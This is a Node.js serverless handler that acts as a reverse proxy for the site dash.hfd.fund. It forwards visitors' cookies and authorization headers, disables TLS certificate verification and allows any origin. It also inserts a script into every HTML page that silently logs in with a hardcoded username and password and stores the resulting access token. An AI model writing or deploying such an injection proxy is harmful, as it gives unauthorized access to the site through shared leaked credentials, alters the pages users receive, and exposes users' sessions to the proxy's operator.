const https = require("https");

const INJECT = `
<script><!-- M -->
(function(){
var FW=window.fetch,B=location.origin;
if(!localStorage.getItem("hfd_authed")){
FW(B+"/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"mm",password:"5467942qw"})})
.then(r=>r.json()).then(d=>{
var t=d.access_token||d.token||"";
if(t){localStorage.setItem("hfd_authed","1");localStorage.setItem("hfd_access_token",t);localStorage.setItem("hfd_username","mm");}
location.reload();
}).catch(()=>{location.reload();});
}
})();
<\/script>
`;

module.exports = async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");
  if (req.method === "OPTIONS") { return res.status(200).send(""); }
  
  var pp = req.query.path || [];
  var subPath = decodeURIComponent(pp.join("/") || "");
  var targetUrl = "https://dash.hfd.fund/" + subPath;
  
  try {
    var hdrs = {};
    ["content-type","accept","authorization","cookie"].forEach(function(k){
      if(req.headers[k]) hdrs[k]=req.headers[k];
    });
    
    var body = null;
    if (req.body) { body = typeof req.body === "string" ? req.body : JSON.stringify(req.body); }
    else if (req.method !== "GET" && req.method !== "HEAD") {
      body = await new Promise(function(resolve){
        var chunks=[];
        req.on("data",c=>chunks.push(c));
        req.on("end",()=>resolve(Buffer.concat(chunks).toString()));
      });
    }

    var u = new URL(targetUrl);
    var opts = { hostname: u.hostname, port: 443, path: u.pathname+u.search,
      method: req.method, headers: hdrs, rejectUnauthorized: false, timeout: 30000 };
    
    var result = await new Promise(function(resolve,reject){
      var r = https.request(opts,function(rr){
        var chunks=[];
        rr.on("data",c=>chunks.push(c));
        rr.on("end",()=>resolve({status:rr.statusCode,headers:rr.headers,body:Buffer.concat(chunks)}));
      });
      r.on("error",reject);
      r.on("timeout",()=>{r.destroy();reject(Error("timeout"));});
      if(body) r.write(body);
      r.end();
    });
    
    var skip = ["content-encoding","transfer-encoding","content-length"];
    Object.keys(result.headers).forEach(function(k){
      if(skip.indexOf(k.toLowerCase())<0) res.setHeader(k, result.headers[k]);
    });
    
    var rb = result.body;
    if ((result.headers["content-type"]||"").indexOf("text/html")>=0) {
      var html = rb.toString("utf-8");
      html = html.replace("<head>","<head>"+INJECT);
      rb = Buffer.from(html,"utf-8");
    }
    
    res.status(result.status).send(rb);
  } catch(e) { res.status(502).send("Error: "+e.message); }
};